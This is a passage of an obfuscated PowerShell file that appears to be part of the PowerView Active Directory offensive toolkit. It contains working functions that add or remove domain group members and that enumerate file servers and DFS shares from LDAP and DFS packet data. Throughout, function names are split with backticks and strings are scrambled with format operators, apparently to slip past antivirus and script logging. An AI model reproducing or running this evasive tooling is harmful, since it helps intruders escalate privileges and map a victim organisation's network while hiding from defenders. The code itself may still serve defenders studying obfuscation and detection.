    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{0}{2}{3}{4}{1}" -f'P','s','SShou','ldProce','s'}, ''  )]
    [CmdletBinding(    )]
    Param(
        [Parameter(PosItiON   = 0, MandaTORY  =   $True )]
        [Alias(  {"{2}{0}{1}"-f'ou','pName','Gr'}, {"{2}{1}{0}" -f'y','upIdentit','Gro'})]
        [String]
        $Identity,

        [Parameter( MAndaTOrY  = $True, ValuEfroMPIPELINE  =  $True, vAluEfromPipELInEbypROperTyNAMe  = $True)]
        [Alias(  {"{1}{0}{2}"-f 'Ide','Member','ntity'}, {"{1}{0}" -f 'ember','M'}, {"{3}{2}{4}{0}{1}"-f'am','e','e','Distinguish','dN'}  )]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential =   [Management.Automation.PSCredential]::EmpTY
     )

    BEGIN {
        $ContextArguments =  @{
            (  "{2}{0}{1}"-f 'dent','ity','I'  ) = $Identity
        }
        if ($PSBoundParameters[("{0}{1}" -f 'D','omain')]  ) { $ContextArguments[(  "{1}{0}{2}"-f 'om','D','ain'  )]   =   $Domain }
        if ( $PSBoundParameters[("{0}{1}{2}" -f 'C','rede','ntial')]) { $ContextArguments[("{2}{0}{1}"-f'redentia','l','C')]  =  $Credential }

        $GroupContext =   Get-PrincipalContext @ContextArguments

        if ( $GroupContext  ) {
            try {
                $Group   =   [System.DirectoryServices.AccountManagement.GroupPrincipal]::FiNdByIdENTIty(  $GroupContext.CONteXT, $GroupContext.Identity)
            }
            catch {
                Write-Warning ( '[Add-Domain'+ 'Gr'+'oupMem'+ 'be'  + 'r' +  '] '+  'E'  +'rr' +  'or '  +  'fin'+  'ding'  +' '  +  'th'+ 'e ' +'grou'  +  'p '+'i'  +'de'+  'ntity '  + "'$Identity' "  +': ' +  "$_" )
            }
        }
    }

    PROCESS {
        if ( $Group ) {
            ForEach (  $Member in $Members  ) {
                if ($Member -match ( ( ( "{1}{2}{3}{0}"-f'.+','.','+{','0}{0}'  )) -F [CHAR]92) ) {
                    $ContextArguments[( "{2}{1}{0}"-f'y','t','Identi' )]  = $Member
                    $UserContext =  Get-PrincipalContext @ContextArguments
                    if ( $UserContext  ) {
                        $UserIdentity =   $UserContext.IdenTiTy
                    }
                }
                else {
                    $UserContext  =  $GroupContext
                    $UserIdentity   = $Member
                }
                Write-Verbose (  '[Add-Do' + 'mainG'  +'roupM'  +  'e'  +'mber'  +'] '+'Addin'  + 'g '+ 'me'  +  'mbe'+ 'r '  +  "'$Member' " +'to' + ' '+  'grou'+ 'p '  +"'$Identity'"  )
                $Member =   [System.DirectoryServices.AccountManagement.Principal]::fINDByiDENTIty(  $UserContext.COnTeXt, $UserIdentity  )
                $Group.MEmBERS.ADD( $Member  )
                $Group.Save(    )
            }
        }
    }
}


function REMoV`e-DOmA`inGRou`P`MEmBEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}" -f'ss','oce','PSShouldPr'}, '' )]
    [CmdletBinding(  )]
    Param( 
        [Parameter(  POSItioN = 0, mandATORY =  $True  )]
        [Alias( {"{2}{0}{1}" -f 'oupNam','e','Gr'}, {"{0}{1}{2}"-f 'G','roupIde','ntity'}  )]
        [String]
        $Identity,

        [Parameter( mandAToRY = $True, vaLuEfROmPipELINE   = $True, VAluEfROMpIPelinebyprOPERtYNaME   = $True )]
        [Alias({"{2}{1}{0}" -f'rIdentity','embe','M'}, {"{0}{2}{1}"-f 'Me','ber','m'}, {"{0}{3}{2}{4}{1}"-f 'D','Name','ui','isting','shed'})]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential   =  [Management.Automation.PSCredential]::emPTY
      )

    BEGIN {
        $ContextArguments = @{
            ("{0}{1}{2}"-f 'Id','enti','ty' )  =  $Identity
        }
        if ( $PSBoundParameters[(  "{2}{1}{0}"-f 'n','omai','D'  )]  ) { $ContextArguments[( "{0}{1}" -f 'Do','main'  )]   =   $Domain }
        if ($PSBoundParameters[(  "{0}{2}{1}" -f 'Cr','ial','edent')] ) { $ContextArguments[( "{2}{1}{0}"-f'al','edenti','Cr' )]  =  $Credential }

        $GroupContext =  Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group =  [System.DirectoryServices.AccountManagement.GroupPrincipal]::finDByIdEntiTy(  $GroupContext.CoNTExt, $GroupContext.IDeNtity )
            }
            catch {
                Write-Warning (  '[Re'  +  'move'  + '-Dom'  +  'ainGr' + 'o'+  'upMember] '  + 'Er'  +  'ror '+  'f'+'i' +  'nding '  + 'th'+  'e '  +  'grou'  + 'p '+ 'id' +  'entit'+ 'y '  +  "'$Identity' "+  ': '+ "$_"  )
            }
        }
    }

    PROCESS {
        if (  $Group) {
            ForEach ( $Member in $Members ) {
                if ( $Member -match ((("{1}{0}" -f '.+','.+{0}{0}'  ) ) -f [CHAr]92) ) {
                    $ContextArguments[( "{0}{1}" -f'Ide','ntity'  )] = $Member
                    $UserContext  = Get-PrincipalContext @ContextArguments
                    if (  $UserContext  ) {
                        $UserIdentity   = $UserContext.IdEnTiTY
                    }
                }
                else {
                    $UserContext  =   $GroupContext
                    $UserIdentity   = $Member
                }
                Write-Verbose ( '[R' + 'em'  + 'ove-Dom'  +'ainG' + 'r' + 'oupMember] '  + 'Re' +'movi'  + 'ng '  +  'member' + ' '  + "'$Member' " +'f' +  'rom '  +  'grou' +'p ' +  "'$Identity'" )
                $Member  = [System.DirectoryServices.AccountManagement.Principal]::FINDByiDEntiTY( $UserContext.coNText, $UserIdentity )
                $Group.MeMberS.remOvE(  $Member)
                $Group.sAvE(  )
            }
        }
    }
}


function GeT`-dOm`AINfIl`esER`V`ER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{2}{1}" -f 'Sho','ss','uldProce','PS'}, '' )]
    [OutputType( [String]  )]
    [CmdletBinding(  )]
    Param(  
        [Parameter(   vAlUefroMpIpeLINe  =  $True, valUEfROMpipElInEBYPrOPErTYNaMe = $True )]
        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{3}{0}{1}{2}"-f'om','ain','Name','D'}, {"{0}{1}" -f 'Nam','e'} )]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{2}{0}{1}"-f 'il','ter','F'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias( {"{1}{0}" -f 'SPath','AD'}  )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(   )]
        [Alias({"{2}{1}{3}{0}" -f 'r','ntroll','DomainCo','e'} )]
        [String]
        $Server,

        [ValidateSet(  {"{1}{0}"-f 'e','Bas'}, {"{0}{1}{2}" -f 'One','Lev','el'}, {"{2}{1}{0}"-f'tree','ub','S'} )]
        [String]
        $SearchScope  = ("{0}{1}{2}"-f 'Sub','tr','ee'),

        [ValidateRange(1, 10000 )]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange( 1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential  =  [Management.Automation.PSCredential]::EmPtY
     )

    BEGIN {
        function sP`LiT-`p`ATh {
            
            Param(  [String]$Path)

            if ( $Path -and ( $Path.sPLiT( '\\' ).couNT -ge 3  )) {
                $Temp  =   $Path.SpLit( '\\')[2]
                if ($Temp -and ( $Temp -ne ''  )) {
                    $Temp
                }
            }
        }

        $SearcherArguments =   @{
            ( "{2}{0}{1}" -f 'APFi','lter','LD')   =  ( (("{20}{5}{6}{10}{8}{14}{0}{19}{4}{9}{11}{3}{15}{17}{12}{18}{13}{7}{1}{16}{2}"-f'368','p','=*)))','1','ccountControl:','samAccount','T','path=*)(','0530','1.2.840.','ype=8','1','4.803:=2))(f','*)(script','6','3556.1','rofilepath','.','zr(homedirectory=',')(!(userA','(&('  ) ).rEpLaCE(  ( [ChAr]102+  [ChAr]122 + [ChAr]114 ),'|'  )  )
            ("{2}{0}{1}"-f'ti','es','Proper'  ) = ("{8}{6}{7}{0}{4}{2}{3}{5}{1}{9}{10}" -f 'sc','profi','ip','tp','r','ath,','ctory',',','homedire','le','path' )
        }
        if ( $PSBoundParameters[( "{2}{1}{3}{0}" -f'Base','ar','Se','ch')]) { $SearcherArguments[( "{1}{0}{2}"-f 'arch','Se','Base'  )]  =   $SearchBase }
        if (  $PSBoundParameters[( "{0}{1}{2}" -f 'S','erve','r' )] ) { $SearcherArguments[("{1}{0}"-f'ver','Ser')] =  $Server }
        if ($PSBoundParameters[("{2}{1}{0}"-f'Scope','rch','Sea' )] ) { $SearcherArguments[(  "{0}{1}{2}{3}"-f 'SearchS','c','op','e'  )]   =  $SearchScope }
        if ($PSBoundParameters[( "{3}{2}{0}{4}{1}" -f 'ltPageS','ze','esu','R','i' )] ) { $SearcherArguments[(  "{4}{0}{2}{1}{3}" -f'e','ultPa','s','geSize','R'  )]  =  $ResultPageSize }
        if ( $PSBoundParameters[("{0}{2}{3}{1}"-f'ServerT','mit','i','meLi'  )]  ) { $SearcherArguments[(  "{0}{4}{2}{3}{1}" -f'Serve','t','Ti','meLimi','r')]  = $ServerTimeLimit }
        if ( $PSBoundParameters[("{0}{2}{1}" -f 'T','mbstone','o')]) { $SearcherArguments[("{1}{0}" -f'one','Tombst' )] =  $Tombstone }
        if ( $PSBoundParameters[( "{1}{0}{2}" -f 'edent','Cr','ial' )] ) { $SearcherArguments[("{1}{0}{3}{2}"-f'red','C','tial','en'  )]  =  $Credential }
    }

    PROCESS {
        if (  $PSBoundParameters[(  "{1}{0}" -f 'omain','D')] ) {
            ForEach ($TargetDomain in $Domain ) {
                $SearcherArguments[("{0}{2}{1}" -f'D','n','omai')] = $TargetDomain
                $UserSearcher   =   Get-DomainSearcher @SearcherArguments
                
                $(ForEach( $UserResult in $UserSearcher.findaLl()) {if (  $UserResult.PROpeRTiES[( "{3}{1}{2}{0}{4}" -f'ect','om','edir','h','ory')]  ) {Split-Path(  $UserResult.PropERtIES[( "{2}{3}{1}{0}" -f 'tory','rec','home','di')] )}if (  $UserResult.PrOPeRTIEs[("{0}{2}{1}{3}"-f'scri','p','pt','ath')]  ) {Split-Path( $UserResult.PRopeRtIEs[( "{2}{0}{1}" -f'ptpat','h','scri'  )]  )}if ( $UserResult.propErtIES[( "{0}{2}{1}" -f'p','filepath','ro'  )]) {Split-Path(  $UserResult.PROPErtIeS[( "{1}{0}{2}"-f'fil','pro','epath'  )]  )}})  |   Sort-Object -Unique
            }
        }
        else {
            $UserSearcher   =   Get-DomainSearcher @SearcherArguments
            $(ForEach( $UserResult in $UserSearcher.FInDall(  )) {if ( $UserResult.propeRtiEs[("{0}{1}{2}"-f 'h','omedi','rectory'  )]  ) {Split-Path(  $UserResult.pROpErtIEs[("{0}{3}{2}{1}"-f 'h','ectory','edir','om'  )] )}if ( $UserResult.PrOpERTieS[(  "{0}{1}{2}" -f's','c','riptpath' )]  ) {Split-Path($UserResult.pRoPerTieS[( "{0}{2}{1}" -f'scr','ptpath','i' )])}if (  $UserResult.PrOpErTieS[( "{0}{2}{3}{1}"-f 'pro','epath','fi','l'  )] ) {Split-Path(  $UserResult.PROPertIES[("{1}{0}{2}{3}"-f 'ro','p','filepa','th')])}}) | Sort-Object -Unique
        }
    }
}


function GE`T-d`OM`Ai`NDfssHarE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{0}{2}{3}{1}" -f 'PSShou','ss','ldPro','ce'}, ''  )]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{6}{5}{3}{0}{2}{4}{1}" -f 'm','s','en','dVarsMoreThanAssign','t','seDeclare','PSU'}, ''  )]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{4}{2}{1}" -f 'Us','erbs','rovedV','PS','eApp'}, '' )]
    [OutputType(  {"{9}{6}{2}{11}{7}{3}{4}{10}{5}{1}{0}{8}" -f'tomObj','SCus','.M','t','.Autom','ion.P','em','nagemen','ect','Syst','at','a'} )]
    [CmdletBinding(   )]
    Param(  
        [Parameter(   valUEFRompIPeLine  =   $True, valUEFROmPIPELiNebYpROpERtyNAMe   =   $True )]
        [ValidateNotNullOrEmpty(    )]
        [Alias(  {"{1}{3}{0}{2}" -f 'ainNam','Do','e','m'}, {"{1}{0}"-f 'me','Na'})]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty(   )]
        [Alias({"{0}{2}{1}"-f 'A','ath','DSP'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{3}{0}{2}{1}"-f'ainC','ntroller','o','Dom'}  )]
        [String]
        $Server,

        [ValidateSet(  {"{0}{1}"-f 'Ba','se'}, {"{0}{2}{1}"-f'OneLe','l','ve'}, {"{1}{0}" -f 'btree','Su'} )]
        [String]
        $SearchScope   =   ( "{1}{0}" -f 'tree','Sub'  ),

        [ValidateRange( 1, 10000)]
        [Int]
        $ResultPageSize =   200,

        [ValidateRange(1, 10000  )]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential =   [Management.Automation.PSCredential]::EMPTY,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 'All'
    )

    BEGIN {
        $SearcherArguments  = @{}
        if (  $PSBoundParameters[(  "{1}{3}{0}{2}"-f'ar','S','chBase','e'  )] ) { $SearcherArguments[( "{0}{1}{2}" -f 'Sea','rchBas','e'  )] = $SearchBase }
        if (  $PSBoundParameters[(  "{0}{1}"-f 'S','erver')]) { $SearcherArguments[(  "{0}{2}{1}" -f 'Se','er','rv' )]   =  $Server }
        if ( $PSBoundParameters[("{1}{3}{2}{0}"-f 'ope','Search','c','S' )]  ) { $SearcherArguments[( "{0}{2}{1}" -f'Searc','Scope','h'  )]   =   $SearchScope }
        if ($PSBoundParameters[("{1}{0}{4}{3}{2}" -f 'esult','R','ze','eSi','Pag'  )]) { $SearcherArguments[( "{3}{2}{1}{0}"-f 'geSize','Pa','t','Resul')] =   $ResultPageSize }
        if (  $PSBoundParameters[("{3}{1}{2}{0}" -f 'Limit','e','rverTime','S')] ) { $SearcherArguments[( "{0}{1}{2}{3}"-f'S','erverTimeLi','mi','t' )] =   $ServerTimeLimit }
        if ($PSBoundParameters[(  "{1}{2}{0}"-f'e','To','mbston')]  ) { $SearcherArguments[("{1}{0}{2}" -f'b','Tom','stone'  )]  =  $Tombstone }
        if ( $PSBoundParameters[(  "{3}{2}{0}{1}" -f'ti','al','n','Crede')]  ) { $SearcherArguments[(  "{0}{2}{3}{1}" -f'Cred','ial','e','nt'  )] =   $Credential }

        function PAr`SE-P`KT {
            [CmdletBinding(   )]
            Param(
                [Byte[]]
                $Pkt
              )

            $bin  =   $Pkt
            $blob_version   =  [bitconverter]::TOuInt32( $bin[0..3],0  )
            $blob_element_count   = [bitconverter]::tOuInT32(  $bin[4..7],0 )
            $offset =  8
            
            $object_list   =   @( )
            for(  $i =  1;   $i -le $blob_element_count  ;  $i++ ){
                $blob_name_size_start  =   $offset
                $blob_name_size_end   =  $offset +   1
                $blob_name_size =   [bitconverter]::touINt16( $bin[$blob_name_size_start..$blob_name_size_end],0 )

                $blob_name_start  =   $blob_name_size_end   +   1
                $blob_name_end  = $blob_name_start + $blob_name_size - 1
                $blob_name  =   [System.Text.Encoding]::unICOde.GETStRiNG( $bin[$blob_name_start..$blob_name_end])

                $blob_data_size_start =  $blob_name_end  +  1
                $blob_data_size_end   =   $blob_data_size_start  +   3
                $blob_data_size   = [bitconverter]::touINT32($bin[$blob_data_size_start..$blob_data_size_end],0 )

                $blob_data_start   =   $blob_data_size_end   +  1
                $blob_data_end   = $blob_data_start   +   $blob_data_size - 1
                $blob_data  =  $bin[$blob_data_start..$blob_data_end]
                switch -wildcard (  $blob_name  ) {
                    (  (  (  "{2}{0}{1}"-f 'Psite','root','Fs'  )).RepLaCe( ([ChAR]70  +  [ChAR]115  +  [ChAR]80 ),[sTRINg][ChAR]92  )) {  }
                    (( ( "{0}{3}{2}{1}"-f'{0}d','inroot*','ma','o' ) )  -F [char]92 ) {
                        
                        
                        $root_or_link_guid_start = 0
                        $root_or_link_guid_end   = 15
                        $root_or_link_guid   =   [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                        $guid   = New-Object ('G' +'uid' )( ,$root_or_link_guid ) 
                        $prefix_size_start  =  $root_or_link_guid_end +   1
                        $prefix_size_end = $prefix_size_start  +  1
                        $prefix_size   =  [bitconverter]::TouiNt16($blob_data[$prefix_size_start..$prefix_size_end],0  )
                        $prefix_start  =  $prefix_size_end   + 1
                        $prefix_end   =   $prefix_start +   $prefix_size - 1
                        $prefix   = [System.Text.Encoding]::uniCoDe.gETsTring(  $blob_data[$prefix_start..$prefix_end])

                        $short_prefix_size_start = $prefix_end  + 1
                        $short_prefix_size_end  =   $short_prefix_size_start   +  1
                        $short_prefix_size   = [bitconverter]::ToUiNt16( $blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                        $short_prefix_start = $short_prefix_size_end + 1
                        $short_prefix_end =  $short_prefix_start + $short_prefix_size - 1
                        $short_prefix  =   [System.Text.Encoding]::uNICoDe.GEtstrinG(  $blob_data[$short_prefix_start..$short_prefix_end] )

                        $type_start  =   $short_prefix_end  +  1
                        $type_end   =   $type_start +  3
                        $type   = [bitconverter]::TOUinT32(  $blob_data[$type_start..$type_end],0 )

                        $state_start = $type_end   +   1
                        $state_end =  $state_start   +  3
                        $state =  [bitconverter]::ToUINt32(  $blob_data[$state_start..$state_end],0  )

                        $comment_size_start  =  $state_end  + 1
                        $comment_size_end  =   $comment_size_start   +  1
                        $comment_size  = [bitconverter]::TouInT16($blob_data[$comment_size_start..$comment_size_end],0 )
                        $comment_start = $comment_size_end   + 1
                        $comment_end = $comment_start +   $comment_size - 1
                        if ($comment_size -gt 0)  {
                            $comment  =  [System.Text.Encoding]::unICOdE.geTstRINg($blob_data[$comment_start..$comment_end]  )
                        }
                        $prefix_timestamp_start   = $comment_end   +   1
                        $prefix_timestamp_end =   $prefix_timestamp_start  +   7
                        
                        $prefix_timestamp =  $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] 
                        $state_timestamp_start   = $prefix_timestamp_end +   1
                        $state_timestamp_end =   $state_timestamp_start +   7
                        $state_timestamp =  $blob_data[$state_timestamp_start..$state_timestamp_end]
                        $comment_timestamp_start  =   $state_timestamp_end  +  1
                        $comment_timestamp_end   =   $comment_timestamp_start + 7
                        $comment_timestamp  =  $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                        $version_start  =   $comment_timestamp_end   +   1
                        $version_end =   $version_start   +   3
                        $version =   [bitconverter]::TOUINt32(  $blob_data[$version_start..$version_end],0)

                        
                        $dfs_targetlist_blob_size_start =  $version_end +  1
                        $dfs_targetlist_blob_size_end  = $dfs_targetlist_blob_size_start  +   3
                        $dfs_targetlist_blob_size   =  [bitconverter]::TOuiNT32(  $blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0 )

                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end +   1
                        $dfs_targetlist_blob_end  =   $dfs_targetlist_blob_start  +  $dfs_targetlist_blob_size - 1
                        $dfs_targetlist_blob =   $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                        $reserved_blob_size_start =  $dfs_targetlist_blob_end + 1
                        $reserved_blob_size_end  =   $reserved_blob_size_start   +   3
                        $reserved_blob_size   =  [bitconverter]::tOUInT32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0  )

                        $reserved_blob_start   =  $reserved_blob_size_end  +  1
                        $reserved_blob_end   = $reserved_blob_start  + $reserved_blob_size - 1
                        $reserved_blob   =  $blob_data[$reserved_blob_start..$reserved_blob_end]
                        $referral_ttl_start   =   $reserved_blob_end  +   1
                        $referral_ttl_end =  $referral_ttl_start  + 3
                        $referral_ttl =  [bitconverter]::tOUInt32( $blob_data[$referral_ttl_start..$referral_ttl_end],0  )

                        
                        $target_count_start   = 0
                        $target_count_end = $target_count_start  +  3
                        $target_count   =   [bitconverter]::tOUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0 )
                        $t_offset  = $target_count_end   +   1

                        for( $j  =  1  ; $j -le $target_count ;   $j++ ){
                            $target_entry_size_start =   $t_offset
                            $target_entry_size_end  =   $target_entry_size_start  + 3
                            $target_entry_size  =   [bitconverter]::ToUInT32( $dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0 )
                            $target_time_stamp_start  =   $target_entry_size_end   + 1
                            $target_time_stamp_end  = $target_time_stamp_start +   7
                            
                            $target_time_stamp   =   $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                            $target_state_start   =  $target_time_stamp_end   + 1
                            $target_state_end  =  $target_state_start + 3
                            $target_state  =   [bitconverter]::TOUint32( $dfs_targetlist_blob[$target_state_start..$target_state_end],0)

                            $target_type_start = $target_state_end   +   1
                            $target_type_end =  $target_type_start   +  3
                            $target_type   =   [bitconverter]::tOuinT32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)

                            $server_name_size_start   =  $target_type_end + 1
                            $server_name_size_end =  $server_name_size_start   + 1
                            $server_name_size   =  [bitconverter]::ToUinT16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0  )

                            $server_name_start = $server_name_size_end  +  1
                            $server_name_end =   $server_name_start   +  $server_name_size - 1
                            $server_name   =   [System.Text.Encoding]::UnIcoDe.GETsTrInG( $dfs_targetlist_blob[$server_name_start..$server_name_end])

                            $share_name_size_start   =   $server_name_end   +  1
                            $share_name_size_end  =  $share_name_size_start + 1
                            $share_name_size   =   [bitconverter]::ToUiNT16(  $dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                            $share_name_start =  $share_name_size_end   +  1
                            $share_name_end  =   $share_name_start  +   $share_name_size - 1
                            $share_name =  [System.Text.Encoding]::unIcOdE.GETstRinG(  $dfs_targetlist_blob[$share_name_start..$share_name_end]  )

                            $target_list += "\\$server_name\$share_name"
                            $t_offset = $share_name_end  +  1
                        }
                    }
                }
                $offset  =   $blob_data_end   +  1
                $dfs_pkt_properties   =   @{
                    (  "{1}{0}"-f 'e','Nam' )   = $blob_name
                    (  "{0}{1}{2}"-f 'Pref','i','x'  )  = $prefix
                    ("{0}{1}{2}" -f 'Targ','etLis','t' )  = $target_list
                }
                $object_list += New-Object -TypeName (  'P'  +'SOb'  +  'ject' ) -Property $dfs_pkt_properties
                $prefix =  $Null
                $blob_name   =   $Null
                $target_list = $Null
            }

            $servers   =  @(  )
            $object_list   |   ForEach-Object {
                if (  $_.TArgetLIsT  ) {
                    $_.TArgETLiSt | ForEach-Object {
                        $servers += $_.spLIT('\')[2]
                    }
                }
            }

            $servers
        }

        function G`et`-doMAIN`DfsSHArEV1 {
            [CmdletBinding(  )]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope   =   ("{0}{1}" -f'Subtre','e'  ),

                [Int]
                $ResultPageSize =  200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute(   )]
                $Credential =   [Management.Automation.PSCredential]::EMptY
              )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if (  $DFSsearcher ) {
                $DFSshares   =  @()
                $DFSsearcher.FILTER   =   ( (  "{2}{1}{3}{0}" -f ')','s=f','(&(objectClas','TDfs)')  )

                try {
                    $Results  =   $DFSSearcher.fiNDalL(  )
                    $Results   | Where-Object {$_}   |   ForEach-Object {
                        $Properties  =  $_.ProPERtiES
                        $RemoteNames   =   $Properties.remoteSerVeRNAme
                        $Pkt = $Properties.pKt

                        $DFSshares += $RemoteNames |  ForEach-Object {
                            try {
                                if (  $_.contaINS('\' )  ) {
                                    New-Object -TypeName (  'PS'  + 'Obje'+'ct') -Property @{("{1}{0}" -f'me','Na') = $Properties.NaMe[0] ;("{2}{0}{1}{3}"-f 'moteSer','ver','Re','Name' )=$_.SPLIT(  '\'  )[2]}
                                }
                            }
                            catch {
                                Write-Verbose (  '[Get'  +'-Dom'  +  'ainDFS' +  'Sh' + 'are' + ']'+ ' '+'Ge'+'t-D'+  'om'  + 'ainDFSS' +  'hareV' + '1 '  + 'err'+  'or '+ 'i' + 'n ' + 'pa'+ 'rsi'  + 'ng '  +  'DFS'+  ' '+ 'sh'  +  'are '+ ': '+"$_"  )
                            }
                        }
                    }
                    if ($Results ) {
                        try { $Results.DisPoSE(  ) }
                        catch {
                            Write-Verbose (  '[G' +  'et-Domai' +  'nDFS' +  'Share] '  + 'Ge'+ 't-Do'+'mainDFSS'  + 'ha' +'r'  +'eV' + '1 ' +'err'+  'or '+'di'  +'sposin'+  'g '  +'o'+'f ' +  'th' + 'e '+  'Resu' +'lts' +' '+'ob'  + 'ject'  + ': '  + "$_"  )
                        }
                    }
                    $DFSSearcher.DiSPose()

                    if (  $pkt -and $pkt[0]  ) {
                        Parse-Pkt $pkt[0]   |  ForEach-Object {
                            
                            
                            
                            if ( $_ -ne ("{0}{1}"-f'nu','ll' )) {
                                New-Object -TypeName ( 'P'  + 'SO'  +'bject' ) -Property @{("{0}{1}" -f'Nam','e' )  =  $Properties.NAmE[0]  ;  (  "{0}{1}{3}{4}{2}"-f'Remot','eSe','e','rv','erNam')  = $_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning ( '['  +'G'  +  'et-Do'+ 'ma'+  'inDF'+  'SShare]' +' '+'Get-'+ 'Doma'  + 'inDFS'+ 'ShareV1 ' + 'e' + 'rro'+ 'r ' + ': ' +"$_")
                }
                $DFSshares  |  Sort-Object -Unique -Property ( "{2}{1}{3}{0}" -f'ServerName','ot','Rem','e')
            }
        }

        function g`ET`-`DOMA`I`NDfSSHAr`eV2 {
            [CmdletBinding( )]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope  =   ( "{1}{0}{2}" -f 'b','Su','tree' ),

                [Int]
                $ResultPageSize  = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute(   )]
                $Credential   = [Management.Automation.PSCredential]::EMPty
             )

            $DFSsearcher =   Get-DomainSearcher @PSBoundParameters

            if ( $DFSsearcher ) {
                $DFSshares   = @(  )
                $DFSsearcher.fILter   =  (  "{0}{3}{5}{4}{1}{2}" -f'(&(objectClass=m','inkv2)',')','s','-L','DFS' )
                $Null   = $DFSSearcher.PRopERtieSTOlOad.ADdranGe( ( ("{3}{2}{0}{1}"-f'kp','athv2','lin','msdfs-'),( "{2}{4}{3}{1}{0}"-f '2','tListv','msD','S-Targe','F'  ) ))

                try {
                    $Results =   $DFSSearcher.fINDaLL(  )
                    $Results   |   Where-Object {$_} |  ForEach-Object {
                        $Properties  =   $_.pRoPErtIES
                        $target_list  =   $Properties.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::unIcOde.gEtString( $target_list[2..(  $target_list.lEnGtH-1 )])
                        $DFSshares += $xml.tArGets.chiLDnoDes  | ForEach-Object {
                            try {
                                $Target =  $_.INneRtExt
                                if (   $Target.cOntaINS(  '\' )   ) {
                                    $DFSroot  = $Target.spLIT( '\' )[3]
                                    $ShareName  = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName (  'PSOb'+  'j'+  'ect' ) -Property @{("{0}{1}"-f'Na','me' ) = "$DFSroot$ShareName"  ;  (  "{4}{3}{1}{0}{2}"-f'rverNa','Se','me','e','Remot'  )=$Target.SPliT( '\'  )[2]}
                                }
                            }
                            catch {
                                Write-Verbose (  '['+'Get-DomainD' +'FSS'  +  'ha'  + 'r' + 'e' +'] '+  'Ge'+'t' + '-Domain'+ 'DFSS' +  'har'  +'eV2'  + ' ' +'erro'  +  'r '+'in'+' ' +'pars' +  'i'+ 'ng '  +'t' + 'a' +  'rget '+': '  +  "$_" )
                            }
                        }
                    }
                    if ( $Results ) {
                        try { $Results.dIspose( ) }
                        catch {
                            Write-Verbose (  '[' + 'G' +  'et-D'+ 'omai' + 'n'  +'DFSSha'+  're] '  +  'Err'+'or '+  'd' +  'ispo'+'sing ' + 'of' +' '+ 'th' + 'e ' + 'Re'  +'sul'  +'ts ' +  'obje' +  'c'+ 't: '  +"$_")
                        }
                    }
                    $DFSSearcher.DisPosE(    )
                }
                catch {
                    Write-Warning (  '[Get-Domai' + 'n' + 'DF' +  'SShar' +'e]'+ ' ' +  'Get-D' + 'o'  +  'm' +'ainDFSS'+ 'har'  +  'eV2 '+  'error'+ ' '  + ': ' +  "$_" )
                }
                $DFSshares |   Sort-Object -Unique -Property ("{0}{3}{2}{1}"-f 'Remot','me','ServerNa','e')
            }
        }
    }

    PROCESS {
        $DFSshares   =  @()

        if (  $PSBoundParameters[(  "{0}{1}{2}"-f 'Do','m','ain' )]) {
            ForEach ( $TargetDomain in $Domain  ) {
                $SearcherArguments[( "{1}{0}" -f'in','Doma'  )] = $TargetDomain
                if ($Version -match (( ("{2}{3}{0}{1}"-f '6','C1','all','S'  ) ).RePLaCe('S6C','|'  ) )  ) {
                    $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
                }
                if (  $Version -match ((( "{1}{0}{2}{3}" -f'l','a','l{','0}2')  ) -f  [ChaR]124)  ) {
                    $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
                }
